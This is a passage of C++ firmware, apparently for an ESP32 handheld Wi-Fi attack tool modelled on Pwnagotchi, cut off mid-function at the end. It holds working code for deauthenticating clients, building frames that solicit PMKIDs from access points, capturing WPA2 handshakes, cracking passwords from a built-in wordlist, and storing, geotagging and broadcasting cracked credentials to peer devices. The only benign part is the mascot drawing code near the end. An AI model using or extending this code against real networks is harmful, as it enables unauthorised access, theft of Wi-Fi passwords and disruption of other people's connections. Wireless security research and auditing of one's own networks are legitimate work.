// Persist a cracked credential: no SD → NVS "wifi" (connectable, read by sw/cw);
// SD → pwn's cracked.csv log. Also remembers it as a session prior. Returns true
// if it reached durable storage.
static bool pwnPersistCred(const uint8_t* bssid, const char* ssid, const char* pw) {
    bool dup = false;
    for (auto& p : s_ramPriors) if (p == pw) { dup = true; break; }
    if (!dup) s_ramPriors.push_back(String(pw));
    if (s_haveSd) { crackedAppend(bssid, ssid, pw); return true; }   // opens its own ScopedPromiscPause
    ScopedPromiscPause _;
    return wifiCredsSaveNvs(String(ssid), String(pw));              // false if SSID > 15 chars (NVS key cap)
}
// Queue a cracked cred for grid broadcast (sent on the next few grid-TX ticks,
// gated to active/passive in the loop).
static void pwnShareCred(const uint8_t* bssid, const char* ssid, const char* pw) {
    strncpy(s_shareSsid, ssid, sizeof(s_shareSsid) - 1); s_shareSsid[sizeof(s_shareSsid) - 1] = 0;
    strncpy(s_sharePsk,  pw,   sizeof(s_sharePsk)  - 1); s_sharePsk[sizeof(s_sharePsk)  - 1] = 0;
    memcpy(s_shareBssid, bssid, 6);
    s_shareReps = 3;
}
// Run one time-sliced pass of the RAM crack. Returns 1 hit (foundOut set), 0 more
// to go, -1 exhausted (not in the built-in list).
static int pwnRamCrackSlice(char* foundOut, size_t foundN) {
    if (!s_ramJobActive) return -1;
    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);
    auto tryPw = [&](const char* pw) -> bool {
        return s_ramJob.haveHs
            ? wpacrack::verifyHandshake(pw, s_ramJob.ssid, s_ramJob.apMac, s_ramJob.staMac,
                                        s_ramJob.anonce, s_ramJob.snonce, s_ramJob.eapol,
                                        s_ramJob.eapolLen, s_ramJob.mic, &ctx, sha1)
            : wpacrack::verifyPMKID(pw, s_ramJob.ssid, s_ramJob.apMac, s_ramJob.staMac,
                                    s_ramJob.pmkid, &ctx, sha1);
    };
    int result = 0;
    if (!s_ramJobPriDone) {                         // session priors first (short list, do all)
        for (auto& pw : s_ramPriors)
            if (tryPw(pw.c_str())) { strncpy(foundOut, pw.c_str(), foundN - 1); result = 1; break; }
        s_ramJobPriDone = true;
    }
    if (!result) {
        uint32_t t0 = millis();
        while (s_ramJobIdx < (long)wpacrack::kBuiltinCount && millis() - t0 < PWN_CRACK_SLICE_MS) {
            if (tryPw(wpacrack::kBuiltins[s_ramJobIdx])) {
                strncpy(foundOut, wpacrack::kBuiltins[s_ramJobIdx], foundN - 1); result = 1; break;
            }
            s_ramJobIdx++;
        }
    }
    mbedtls_md_free(&ctx);
    if (result) return 1;
    return (s_ramJobIdx >= (long)wpacrack::kBuiltinCount) ? -1 : 0;
}

// opportunistic geotag — only reads GPS if the task is ALREADY running (never starts
// it: the GpsManager first-fix NVS flash write can corrupt WiFi DMA while promiscuous).
static void pwnGeo(char* latS, char* lonS, size_t n) {
    latS[0] = lonS[0] = 0;
#ifdef BOARD_TDECK_PLUS
    GpsManager& gm = GpsManager::instance();
    if (gm.isRunning() && gm.isValid()) {
        snprintf(latS, n, "%.6f", gm.lat());
        snprintf(lonS, n, "%.6f", gm.lon());
    }
#endif
}

// write the in-progress capture to a .cap (synth beacon + M1 [+ M2]) + log it
static bool s_lastSaveOk = false; static char s_lastSaveFile[80];
static void flushCapture(int8_t rssi, uint8_t ch) {
    if (!s_cap.active || !s_cap.haveM1) return;
    if (!s_cap.ssid[0]) {                          // M1 arrived before any beacon → recover the
        PwnTarget* tt = targFind(s_cap.bssid);     // SSID from the target table (a beacon since?)
        if (tt && tt->ssid[0]) strncpy(s_cap.ssid, tt->ssid, 32);
    }
    if (!s_cap.ssid[0]) return;                     // still unknown (hidden SSID) → can't crack, skip
    bool isHs = s_cap.haveM2;
    bool isPmkid = s_cap.m1HasPmkid;
    if (!isHs && !isPmkid) return;                 // nothing crackable yet

    if (!s_haveSd) {
        // Cardless: no .cap. Stash ONE RAM crack job (one HS at a time); if the slot
        // is busy, drop this capture (leave the target un-captured so it re-caught later).
        if (!s_ramJobActive) {
            capparse::CrackJob job;
            if (capparse::parseFrames(s_cap.ssid, s_cap.m1, s_cap.m1Len,
                                      isHs ? s_cap.m2 : nullptr, s_cap.m2Len, job)) {
                s_ramJob = job; s_ramJobActive = true; s_ramJobIdx = 0; s_ramJobPriDone = false;
                memcpy(s_ramJobBssid, s_cap.bssid, 6);
                PwnTarget* t2 = targFind(s_cap.bssid);      // out of the prey list; crack decides final fate
                if (t2) t2->captured = true;
            }
        }
        s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.m1HasPmkid = false;
        return;
    }

    char path[96]; capPath(s_cap.bssid, s_cap.ssid, path, sizeof(path));
    { ScopedPromiscPause _;
      File f = SD.open(path, FILE_WRITE);
      if (f) {
          pcap::writeGlobalHeader(f);
          uint8_t bcn[80]; uint16_t bl = buildBeacon(s_cap.bssid, s_cap.ssid, bcn);
          pcap::writeRecord(f, bcn, bl, millis());
          pcap::writeRecord(f, s_cap.m1, s_cap.m1Len, millis());
          if (isHs) pcap::writeRecord(f, s_cap.m2, s_cap.m2Len, millis());
          f.close();
          strncpy(s_lastSaveFile, path, sizeof(s_lastSaveFile) - 1);
          s_lastSaveOk = true;
          s_sessionCaps.push_back(String(path));      // for [k] session-only cracking
      }
      // captured.csv event row (+ opportunistic lat,lon on Plus with a live fix)
      File c = SD.open(PWN_F_CAPTURED, FILE_APPEND);
      if (c) {
          char mac[18]; macStr(s_cap.bssid, mac);
          char cssid[33]; csvSsid(s_cap.ssid, cssid, sizeof(cssid));
          char la[16], lo[16]; pwnGeo(la, lo, sizeof(la));
          c.printf("@%lu,%s,%s,%u,%s,%d,%s,%s\n", (unsigned long)millis(), mac, cssid,
                   ch, isHs ? "HS" : "PMKID", rssi, la, lo);
          c.close();
      }
    }
    PwnTarget* t = targFind(s_cap.bssid);
    if (t) t->captured = true;
    s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.m1HasPmkid = false;
}

// drain one frame from the ring; returns event char for the ticker ('B','1','2',0)
static char drainOne(uint8_t curCh) {
    if (s_rTail == s_rHead) return 0;
    PwnFrame fr; PwnFrame& src = (PwnFrame&)s_ring[s_rTail];
    memcpy(&fr, (const void*)&src, sizeof(PwnFrame));
    s_rTail = (s_rTail + 1) % PWN_RING;

    if (fr.kind == 0) {                                 // beacon → learn SSID
        const uint8_t* b = fr.data + 10;                // beacon: SA/BSSID at +10/+16
        if (memcmp(b, s_apMac, 6) == 0) return 0;       // our own hidden softAP → ignore
        char ssid[33] = {0};
        dot11::extractSSID(fr.data, fr.len, dot11::ST_BEACON, ssid, sizeof(ssid));
        // Always track (even whitelisted) so we KNOW the SSID and can honour an
        // SSID-whitelist on this AP's handshakes; the wl flag blocks attack + capture.
        PwnTarget* t = targAdd(b, ssid, curCh, fr.rssi);
        if (t) t->wl = whitelisted(b, ssid);
        return 'B';
    }
    if (fr.kind == 3) {                                 // AL-ANQA grid frame from a peer
        if (memcmp(fr.data + 10, s_gridMac, 6) == 0) return 0;   // our own broadcast — ignore
        if (fr.len < PWN_GRID_ADV_OFF + 5) return 0;
        const uint8_t* pl = fr.data + PWN_GRID_ADV_OFF;
        if (memcmp(pl, "ANQG", 4) == 0) {               // peer advert (stats)
            if (fr.len < PWN_GRID_ADV_OFF + (int)sizeof(GridAdv)) return 0;
            GridAdv a; memcpy(&a, pl, sizeof(a));
            char nm[13]; strncpy(nm, a.name, 12); nm[12] = 0;
            bool isNew = gridPeerUpdate(nm, a.pwned, a.hs, fr.rssi);
            if (isNew) { strncpy(s_metName, nm, sizeof(s_metName) - 1); s_metName[12] = 0; return 'G'; }
            return 0;
        }
        if (memcmp(pl, "ANQC", 4) == 0) {               // peer shared a cracked credential
            if (fr.len < PWN_GRID_ADV_OFF + (int)sizeof(GridCred)) return 0;
            if (s_credRxPending) return 0;              // a prior cred not yet persisted — wait
            GridCred c; memcpy(&c, pl, sizeof(c));
            c.ssid[sizeof(c.ssid) - 1] = 0; c.psk[sizeof(c.psk) - 1] = 0;
            if (!c.ssid[0]) return 0;
            for (auto& s : s_gridLearned) if (s == c.ssid) return 0;   // already learned
            strncpy(s_credRxSsid, c.ssid, sizeof(s_credRxSsid) - 1); s_credRxSsid[sizeof(s_credRxSsid) - 1] = 0;
            strncpy(s_credRxPsk,  c.psk,  sizeof(s_credRxPsk)  - 1); s_credRxPsk[sizeof(s_credRxPsk)  - 1] = 0;
            memcpy(s_credRxBssid, c.bssid, 6);
            s_credRxPending = true;                     // main loop persists it (SD/NVS off the hot path)
            return 'C';
        }
        return 0;
    }
    if (fr.kind == 2) {                                 // data frame → learn a client STA
        bool td = dot11::toDS(fr.data), fd = dot11::fromDS(fr.data);
        const uint8_t *bssid = nullptr, *sta = nullptr;
        if (td && !fd)      { bssid = fr.data + 4;  sta = fr.data + 10; }   // STA → AP
        else if (!td && fd) { bssid = fr.data + 10; sta = fr.data + 4;  }   // AP → STA
        if (bssid && sta) {
            PwnTarget* tt = targFind(bssid);            // only for APs we're tracking
            if (tt && !tt->captured && !whitelisted(bssid, tt->ssid)) cliAdd(bssid, sta);
        }
        return 0;
    }
    // EAPOL
    dot11::Eapol ev;
    if (!dot11::parseEapol(fr.data, fr.len, ev)) return 0;
    const uint8_t* b = dot11::dataBssid(fr.data);
    PwnTarget* t = targFind(b);
    if (t) t->rssi = fr.rssi;                            // refresh signal
    if (t && (t->captured || t->wl)) return 0;          // already own it OR whitelisted
    char ssidTmp[33] = {0}; if (t) strncpy(ssidTmp, t->ssid, 32);
    if (whitelisted(b, ssidTmp)) return 0;              // bssid-whitelist even without a target yet

    if (ev.msg == 1) {
        // start/refresh capture for this bssid
        if (!s_cap.active || memcmp(s_cap.bssid, b, 6) != 0) {
            memset(&s_cap, 0, sizeof(s_cap));
            s_cap.active = true; s_cap.startMs = millis(); memcpy(s_cap.bssid, b, 6);
            if (t) strncpy(s_cap.ssid, t->ssid, 32);
        }
        memcpy(s_cap.m1, fr.data, fr.len); s_cap.m1Len = fr.len; s_cap.haveM1 = true;
        // PMKID present in M1 key-data?
        if (ev.len >= 99) {
            uint16_t kdl = ((uint16_t)ev.p[97] << 8) | ev.p[98];
            const uint8_t* kd = ev.p + 99; uint32_t maxkd = ev.len - 99; if (kdl > maxkd) kdl = maxkd;
            for (uint16_t i = 0; i + 22 <= kdl; i++)
                if (kd[i] == 0xDD && kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04) {
                    s_cap.m1HasPmkid = true; break;
                }
        }
        return '1';
    } else if (ev.msg == 2) {
        if (s_cap.active && memcmp(s_cap.bssid, b, 6) == 0) {
            memcpy(s_cap.m2, fr.data, fr.len); s_cap.m2Len = fr.len; s_cap.haveM2 = true;
            return '2';
        }
    }
    return 0;
}

// ── deauth ────────────────────────────────────────────────────────────────────
// Reuse the PROVEN DeauthAttack primitive (the same one da/ws use — HW-verified 100%)
// rather than hand-rolling frames (rule 5b). It sends BOTH deauth (0xC0) and disassoc
// (0xA0) with randomised seq, 3x each with proper gaps — far more reliable at kicking a
// client than the old single-frame version. Injects on WIFI_IF_AP via the softAP brought
// up in runPwnSession (bare STA-unassociated TX does not hit the air — the old bug).
//   client==nullptr → broadcast burst (active).  client set → directed burst (quieter).
static void sendDeauth(DeauthAttack& da, const uint8_t* bssid, const uint8_t* client) {
    if (client) { s_dtxD++; s_txFail += da.sendDirectedBurst(bssid, client); }  // directed (client known)
    else        { s_dtxB++; s_txFail += da.sendBroadcastBurst(bssid); }         // broadcast (no client)
}

// ── active clientless PMKID solicitation (ported from `pm assoc`, rule 5b) ─────
// Inject an open Authentication then an Association-Request advertising WPA2-PSK, so a
// PMKID-caching AP replies with EAPOL M1 carrying the PMKID KDE — captured by pwnRxCb.
// NO deauth, NO real client needed → the quiet, non-disruptive way to score a PMKID.
// The associating client = our REAL STA MAC (via WIFI_IF_STA): the HW owns it so it
// auto-ACKs the AP's auth/assoc replies (else the AP never reaches M1). Unlike `pm` we
// do NOT spoof the STA MAC — our hidden softAP already exposes it, and leaving it put
// keeps the softAP BSSID + grid identity stable. We never send M2, so the fake
// association just times out; the M1/PMKID is already ours. TX on WIFI_IF_AP (the same
// reliable softAP path deauth/grid use — bare STA-unassociated TX doesn't hit the air).
static uint16_t pwnBuildAuth(uint8_t* out, const uint8_t* ap, const uint8_t* sta) {
    uint16_t i = 0;
    out[i++] = 0xB0; out[i++] = 0x00;                 // FC: mgmt / auth
    out[i++] = 0x00; out[i++] = 0x00;                 // duration
    memcpy(out + i, ap,  6); i += 6;                  // A1 = AP (DA)
    memcpy(out + i, sta, 6); i += 6;                  // A2 = our STA (SA)
    memcpy(out + i, ap,  6); i += 6;                  // A3 = BSSID
    out[i++] = 0x00; out[i++] = 0x00;                 // seq
    out[i++] = 0x00; out[i++] = 0x00;                 // auth algorithm = open system
    out[i++] = 0x01; out[i++] = 0x00;                 // auth transaction seq = 1
    out[i++] = 0x00; out[i++] = 0x00;                 // status code = 0
    return i;
}
static uint16_t pwnBuildAssoc(uint8_t* out, const uint8_t* ap, const uint8_t* sta, const char* ssid) {
    uint16_t i = 0;
    out[i++] = 0x00; out[i++] = 0x00;                 // FC: mgmt / assoc-request
    out[i++] = 0x00; out[i++] = 0x00;                 // duration
    memcpy(out + i, ap,  6); i += 6;                  // A1
    memcpy(out + i, sta, 6); i += 6;                  // A2
    memcpy(out + i, ap,  6); i += 6;                  // A3
    out[i++] = 0x00; out[i++] = 0x00;                 // seq
    out[i++] = 0x31; out[i++] = 0x04;                 // capability info (ESS+Privacy+ShortPre/Slot)
    out[i++] = 0x0A; out[i++] = 0x00;                 // listen interval
    uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    out[i++] = 0x00; out[i++] = sl;                   // SSID IE
    for (uint8_t k = 0; k < sl; k++) out[i++] = ssid[k];
    out[i++] = 0x01; out[i++] = 0x08;                 // Supported Rates IE
    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8B; out[i++] = 0x96;
    out[i++] = 0x24; out[i++] = 0x30; out[i++] = 0x48; out[i++] = 0x6C;
    static const uint8_t rsn[] = {                    // RSN IE: WPA2-PSK, CCMP group+pairwise
        0x30, 0x14, 0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,                       // group cipher = CCMP
        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,           // pairwise = CCMP
        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,           // AKM = PSK
        0x00, 0x00                                    // RSN capabilities
    };
    memcpy(out + i, rsn, sizeof(rsn)); i += sizeof(rsn);
    return i;
}
static void solicitPmkid(const uint8_t* bssid, const char* ssid) {
    uint8_t sta[6]; esp_wifi_get_mac(WIFI_IF_STA, sta);
    uint8_t fr[128];
    uint16_t n = pwnBuildAuth(fr, bssid, sta);
    if (esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false) != ESP_OK) s_txFail++;
    vTaskDelay(pdMS_TO_TICKS(30));                    // let the auth-response land + be ACK'd
    n = pwnBuildAssoc(fr, bssid, sta, ssid);
    if (esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false) != ESP_OK) s_txFail++;
    s_solTx++;
}

// ── adaptive channel learner (DEFAULT roam; `pwn basic` disables it) ─ HW-verified ─
// A per-channel non-stationary bandit (Discounted-UCB). The one decision it makes:
// "which channel is worth my time?" — exactly the control problem Pwnagotchi's A2C
// solves (reward = handshakes, levers = channel + dwell), but as ~26 floats instead
// of a neural net. Every ESP32 pwnagotchi (minigotchi = random(), Marauder = fixed
// timer) hops blindly; this learns. Forgetting via the discount γ handles a changing
// area; the UCB √(logN/n) bonus forces re-sampling so a wrong bias self-corrects.
// NOT "AI" — a textbook bandit. Prior art: Pwnagotchi ai/gym.py (NOTICES #23).
#define PWN_LEARN_GAMMA 0.95f     // discount: early hits persist ~20 visits (nimble but not amnesiac)
#define PWN_LEARN_FLOOR 0.5f      // min selection weight for a channel that HOSTS un-captured APs
#define PWN_SCOUT_FLOOR 0.1f      // min weight for an EMPTY channel — just a periodic "scout" peek so
                                  // full-13 stops wasting ~⅓ of its time on dead air (captures faster),
                                  // while still discovering a new/odd-channel AP that appears there
#define PWN_REWARD_CAP  4.0f      // dwell normaliser for adaptive dwell time
#define PWN_PRESENCE_W  0.25f     // reward per un-captured AP present on a channel (standing signal)
#define PWN_PRESENCE_CAP 6        // cap presence count so one crowded channel can't dominate too hard
static bool  s_aiOn = false;
static bool  s_aiDebug = false;   // `pwn ai debug` → trace every decision to ai_debug.log
static float s_lVal[14];          // discounted reward sum   (index = channel 1..13)
static float s_lCnt[14];          // discounted visit count

static void learnReset() { for (int i = 0; i < 14; i++) { s_lVal[i] = 0; s_lCnt[i] = 0; } }
// load persisted table, decayed ×0.5 = an extra cross-session discount so old area
// knowledge is a WEAK prior, not a command (washes out fast if you've moved).
static void learnLoad() {
    learnReset();
    File f = SD.open(PWN_F_LEARN, FILE_READ);
    if (!f) return;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1);
        if (c1 < 0 || c2 < 0) continue;
        int ch = ln.substring(0, c1).toInt();
        if (ch < 1 || ch > 13) continue;
        s_lVal[ch] = ln.substring(c1 + 1, c2).toFloat() * 0.5f;
        s_lCnt[ch] = ln.substring(c2 + 1).toFloat()   * 0.5f;
    }
    f.close();
}
static void learnSave() {
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_LEARN, FILE_WRITE);   // truncate + rewrite (tiny)
    if (!f) return;
    for (int ch = 1; ch <= 13; ch++)
        if (s_lCnt[ch] > 0.001f) f.printf("%d,%.4f,%.4f\n", ch, s_lVal[ch], s_lCnt[ch]);
    f.close();
}
static void learnUpdate(uint8_t ch, float reward) {   // D-UCB discounted sums
    if (ch < 1 || ch > 13) return;
    s_lVal[ch] = PWN_LEARN_GAMMA * s_lVal[ch] + reward;
    s_lCnt[ch] = PWN_LEARN_GAMMA * s_lCnt[ch] + 1.0f;
}
static float learnMean(uint8_t ch) { return (ch >= 1 && ch <= 13 && s_lCnt[ch] > 0.001f) ? s_lVal[ch] / s_lCnt[ch] : 0.0f; }
// does this channel currently host an un-captured, non-whitelisted AP (i.e. real prey)?
static bool chHasPrey(uint8_t ch) {
    for (int i = 0; i < s_nTarg; i++)
        if (s_targ[i].ch == ch && !s_targ[i].captured && !s_targ[i].wl) return true;
    return false;
}
// per-channel floor: full FLOOR where there's prey, tiny SCOUT_FLOOR on empty channels
// (cold start = everything empty = uniform scan until APs are found).
static float chFloor(uint8_t ch) { return chHasPrey(ch) ? PWN_LEARN_FLOOR : PWN_SCOUT_FLOOR; }

// pick the next channel by WEIGHTED-RANDOM selection (probability matching): each
// channel's weight = mean + floor, pick ∝ weight. A productive channel (high mean)
// gets most of the visits; the floor keeps every channel at a nonzero probability so a
// lone/new AP is never starved (the fix for argmax-UCB's 100% camping). The scout floor
// shrinks empty channels' share so full-13 concentrates capture time on real channels.
// Cold start (all means 0, no prey) → uniform scan; still beats minigotchi's random().
static uint8_t learnPick(const uint8_t* set, int n) {
    float total = 0;
    for (int i = 0; i < n; i++) total += learnMean(set[i]) + chFloor(set[i]);
    float r = ((float)(esp_random() % 100000) / 100000.0f) * total;
    float acc = 0;
    for (int i = 0; i < n; i++) {
        acc += learnMean(set[i]) + chFloor(set[i]);
        if (r <= acc) return set[i];
    }
    return set[n - 1];
}
static uint8_t learnFavorite(const uint8_t* set, int n) {   // best *known* channel (no bonus) for the HUD
    float bestM = -1e9f; uint8_t best = set[0];
    for (int i = 0; i < n; i++) { float m = learnMean(set[i]); if (m > bestM) { bestM = m; best = set[i]; } }
    return best;
}

static const char* modeName(PwnMode m);   // defined in the UI section below

// ── debug trace (`pwn ai debug`) — plain-text log so the learner's every decision is
// inspectable offline for tuning the reward weights / γ / C. Append-only, session
// header separates runs. Written with promiscuous paused (GDMA rule). Disabled = no cost.
static void aiDbgSession(PwnMode mode, bool fullChans) {
    if (!s_aiDebug) return;
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_AIDBG, FILE_APPEND);
    if (!f) return;
    f.printf("\n=== pwn ai session @%lu  mode=%s chans=%s  gamma=%.2f floor=%.2f scout=%.2f  reward: cap+10 M1+3 newSTA+2 newAP+1 present+%.2f/ap(cap%d)  select=weighted ===\n",
             (unsigned long)millis(), modeName(mode), fullChans ? "1-13" : "1/6/11", PWN_LEARN_GAMMA, PWN_LEARN_FLOOR, PWN_SCOUT_FLOOR, PWN_PRESENCE_W, PWN_PRESENCE_CAP);
    f.printf("cols: leave c<ch> rew=<this dwell> mean/cnt=<post-update> | per-channel [m<mean> p<pick prob %%>], * = picked | dwell\n");
    f.close();
}
static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, uint32_t dwell, bool fullChans) {
    if (!s_aiDebug) return;
    uint8_t set[13]; int n;
    if (fullChans) { n = 13; for (int i = 0; i < 13; i++) set[i] = i + 1; }
    else           { n = (int)sizeof(PWN_CHANS); for (int i = 0; i < n; i++) set[i] = PWN_CHANS[i]; }
    float totalW = 0; for (int i = 0; i < n; i++) totalW += learnMean(set[i]) + chFloor(set[i]);
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_AIDBG, FILE_APPEND);
    if (!f) return;
    f.printf("@%lu leave c%-2u rew=%4.1f mean=%.2f cnt=%.1f | ",
             (unsigned long)ms, leftCh, reward, learnMean(leftCh), s_lCnt[leftCh]);
    for (int i = 0; i < n; i++) {
        uint8_t ch = set[i];
        float w = learnMean(ch) + chFloor(ch);
        int pct = totalW > 0 ? (int)(100.0f * w / totalW + 0.5f) : 0;
        f.printf("c%u[m%.2f p%02d]%c", ch, learnMean(ch), pct, ch == picked ? '*' : ' ');
    }
    // diag tail. Reading it when m1=0 (no captures):
    //   dD=0 (all broadcast) → no client ever sat on a deauthable AP → clients are on weak
    //        APs below the -80 cutoff (environment). Fix = PMKID solicit / lower cutoff.
    //   dD>0 & txf>0        → the driver is REJECTING frames → real TX bug (softAP/channel).
    //   dD>0 & txf=0 & m1=0 → directed deauth queued fine but no reconnect handshake → the
    //        frame isn't landing on the victim's channel (softAP-vs-hop mismatch) or PMF.
    f.printf(" => c%-2u dwell=%lums  dD=%lu dB=%lu sol=%lu txf=%lu m1=%lu m2=%lu ap=%d cli=%d\n",
             picked, (unsigned long)dwell, (unsigned long)s_dtxD, (unsigned long)s_dtxB,
             (unsigned long)s_solTx, (unsigned long)s_txFail, (unsigned long)s_m1Seen,
             (unsigned long)s_m2Seen, s_nTarg, s_nCli);
    f.close();
}

// ── UI — the AL-ANQA phoenix mascot (drawn with LGFX primitives) ──────────────
extern LGFX tft;                                          // global display (main.ino)

#define C565(r,g,b) (uint16_t)((((r)&0xF8)<<8)|(((g)&0xFC)<<3)|((b)>>3))
static const uint16_t PH_GOLD=C565(246,201,69), PH_AMBER=C565(245,151,42),
    PH_ORANGE=C565(239,107,31), PH_RED=C565(214,59,42), PH_CORE=C565(255,233,168),
    PH_WHITE=C565(255,244,214), PH_ASH=C565(125,115,103), PH_ASHDK=C565(74,64,56),
    PH_BOXBG=C565(11,6,3), PH_BOXBRD=C565(138,74,26), PH_GLOW=C565(94,26,14),
    PH_EYE=C565(58,30,10), PH_MAROON=C565(224,70,110), PH_DIM=C565(85,97,115),
    // muted "keep the fire low" palette for STEALTH posture
    PH_SW=C565(150,95,35), PH_SF=C565(120,55,18), PH_SE=C565(88,34,18);

static const char* modeName(PwnMode m) { return m == PWN_ACTIVE ? "ACTIVE" : m == PWN_STEALTH ? "STEALTH" : "PASSIVE"; }
enum { PM_IDLE, PM_HUNT, PM_CRACK, PM_CAPTURE, PM_PWNED, PM_LONELY };
static int moodId(const char* m) {
    if (!strcmp(m, "PWNED"))   return PM_PWNED;
    if (!strcmp(m, "EXCITED")) return PM_CAPTURE;
    if (!strcmp(m, "SOCIAL"))  return PM_CAPTURE;   // "happy to meet a friend" pose
    if (!strcmp(m, "HUNT"))    return PM_HUNT;
    if (!strcmp(m, "CRACK"))   return PM_CRACK;
    if (!strcmp(m, "LONELY"))  return PM_LONELY;
    return PM_IDLE;
}

// Draw the phoenix centred at (cx,cy) into sprite g, expressing mood m; `fr` drives
// flame flicker / ember drift / blink. Body language carries the emotion: wing
// spread, flame size, eye shape, posture lift, palette (ashen when lonely).
static void drawPhoenix(LGFX_Sprite& g, int cx, int cy, int m, uint32_t fr, float s, int md) {
    auto P = [s](int v) -> int { return (int)(v * s); };     // scale a relative offset
    int flick = (fr & 1) ? P(1) : 0;
    bool blink = ((fr >> 3) % 7) == 0 && m != PM_LONELY;
    uint16_t wing, wingIn, body, core, t1, t2;
    int spread, lift, flame, eye, wingUp;
    switch (m) {
      case PM_HUNT:    wing=PH_AMBER; wingIn=PH_ORANGE; body=PH_GOLD; core=PH_CORE;  t1=PH_RED;    t2=PH_ORANGE; spread=30; lift=0;  flame=2; eye=1; wingUp=6;  break;
      case PM_CRACK:   wing=PH_ORANGE;wingIn=PH_AMBER;  body=PH_GOLD; core=PH_CORE;  t1=PH_ORANGE; t2=PH_AMBER;  spread=20; lift=0;  flame=3; eye=2; wingUp=2;  break;
      case PM_CAPTURE: wing=PH_AMBER; wingIn=PH_GOLD;   body=PH_GOLD; core=PH_CORE;  t1=PH_ORANGE; t2=PH_RED;    spread=26; lift=-3; flame=2; eye=3; wingUp=26; break;
      case PM_PWNED:   wing=PH_GOLD;  wingIn=PH_CORE;   body=PH_WHITE;core=PH_WHITE; t1=PH_RED;    t2=PH_ORANGE; spread=40; lift=-5; flame=4; eye=3; wingUp=34; break;
      case PM_LONELY:  wing=PH_ASH;   wingIn=PH_ASHDK;  body=PH_ASH;  core=PH_ASHDK; t1=PH_ORANGE; t2=PH_ASHDK;  spread=6;  lift=4;  flame=0; eye=4; wingUp=-8; break;
      default:         wing=PH_AMBER; wingIn=PH_ORANGE; body=PH_GOLD; core=PH_CORE;  t1=PH_ORANGE; t2=PH_AMBER;  spread=12; lift=1;  flame=1; eye=0; wingUp=-4; break; // IDLE
    }
    // Mode shapes posture + fire ON TOP of the mood pose (PWNED celebration exempt).
    //  active  = bigger/brighter flame, leans up (fierce)
    //  stealth = muted palette, low ember, crouched (stalker keeping its fire hidden)
    //  passive = the steady middle baseline — unchanged
    if (m != PM_PWNED) {
        if (md == PWN_STEALTH) {
            if (m != PM_LONELY) { wing = PH_SW; wingIn = PH_SE; body = PH_SW; core = PH_SF; t1 = PH_SF; t2 = PH_SE; }
            if (flame > 1) flame = 1;      // keep the fire low
            lift += 5;                      // crouch down
            if (wingUp > 2) wingUp = 2;     // wings tucked, not flared
        } else if (md == PWN_ACTIVE) {
            flame += 1;                     // brighter, bigger fire
            lift -= 1;                       // lean up / forward
        }
    }
    cy += P(lift);
    int hx = cx, hy = cy - P(22);
    g.fillEllipse(cx, cy + P(40), P(38), P(6), PH_GLOW);                 // floor glow
    // wings
    int wtx = P(26 + spread), wty = cy - P(wingUp);
    g.fillTriangle(cx - P(4), cy - P(8), cx - wtx, wty, cx - P(11), cy + P(9), wing);
    g.fillTriangle(cx - P(6), cy - P(4), cx - wtx + P(12), wty + P(8), cx - P(12), cy + P(6), wingIn);
    g.fillTriangle(cx + P(4), cy - P(8), cx + wtx, wty, cx + P(11), cy + P(9), wing);
    g.fillTriangle(cx + P(6), cy - P(4), cx + wtx - P(12), wty + P(8), cx + P(12), cy + P(6), wingIn);
    // body diamond + core
    g.fillTriangle(cx, cy - P(14), cx + P(9), cy + P(8), cx, cy + P(22), body);
    g.fillTriangle(cx, cy - P(14), cx - P(9), cy + P(8), cx, cy + P(22), body);
    g.fillTriangle(cx, cy - P(2), cx + P(4), cy + P(8), cx, cy + P(16), core);
    g.fillTriangle(cx, cy - P(2), cx - P(4), cy + P(8), cx, cy + P(16), core);
    // crest
    g.fillTriangle(hx - P(4), hy - P(7), hx - P(1), hy - P(1), hx + P(2), hy - P(9), wing);
    if (m == PM_HUNT || m == PM_CAPTURE || m == PM_PWNED)
        g.fillTriangle(hx + P(4), hy - P(7), hx + P(1), hy - P(1), hx - P(2), hy - P(9), wing);
    // head + beak
    g.fillCircle(hx, hy, P(7), (m == PM_PWNED) ? PH_WHITE : body);
    g.fillTriangle(hx + P(6), hy - P(1), hx + P(12), hy - P(2), hx + P(6), hy + P(4), PH_ORANGE);
    // eye (the "face")
    if (blink) g.drawFastHLine(hx - P(3), hy, P(6), PH_EYE);
    else switch (eye) {
      case 0: g.fillRect(hx - P(3), hy - P(1), P(6), P(2), PH_EYE); break;                                       // calm flat
      case 1: g.fillCircle(hx + P(1), hy, P(2), PH_EYE); g.drawLine(hx - P(4), hy - P(4), hx + P(1), hy - P(2), PH_EYE); break; // alert+brow
      case 2: g.drawLine(hx - P(4), hy - P(3), hx + P(1), hy, PH_EYE); g.drawLine(hx - P(4), hy + P(3), hx + P(1), hy, PH_EYE); break; // > squint
      case 3: g.drawLine(hx - P(3), hy + P(1), hx, hy - P(2), PH_EYE); g.drawLine(hx, hy - P(2), hx + P(3), hy + P(1), PH_EYE); break; // ^ happy
      case 4: g.drawLine(hx - P(3), hy - P(1), hx - P(1), hy + P(1), PH_EYE); g.drawLine(hx - P(1), hy + P(1), hx + P(2), hy - P(1), PH_EYE); break; // u sad
    }
    // tail flames
    if (flame > 0) {
        g.fillTriangle(cx, cy + P(20), cx - P(4) - flick, cy + P(20 + 6 * flame), cx + P(4) + flick, cy + P(20 + 6 * flame), t1);
        if (flame >= 2) {
